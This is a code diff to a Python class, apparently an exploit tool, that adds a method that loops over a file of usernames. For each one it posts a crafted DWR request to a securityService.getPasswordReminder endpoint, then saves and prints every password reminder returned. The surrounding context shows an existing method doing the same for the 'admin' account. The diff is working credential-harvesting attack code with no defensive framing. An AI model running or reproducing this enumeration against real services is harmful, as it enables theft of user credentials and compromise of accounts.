@@ -149,6 +149,23 @@ class Cofe:
         f.close()
 
 
+    def allRemaindersByName(self):
+        alist = [line.rstrip() for line in  open('users-file.txt')]
+        passwords_file = "passwords-remainder-users.txt"
+        f = open(passwords_file, 'w')
+        for usr in alist:
+            # user = line.strip()
+            exploit = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
+            "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:"+usr,"batchId":'2'}
+
+            r = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", data=exploit, verify=False)
+            if "200" in str(r) and not "404" in r.text:
+                for m in re.findall(r'(".*")', r.text):
+                    f.write(m+"\n")
+                    print("[+] user {} : {}".format(usr, str(m)))
+            
+
+
     def XptGetURemainder(self):
         exploit = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
         "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:admin","batchId":'2'}
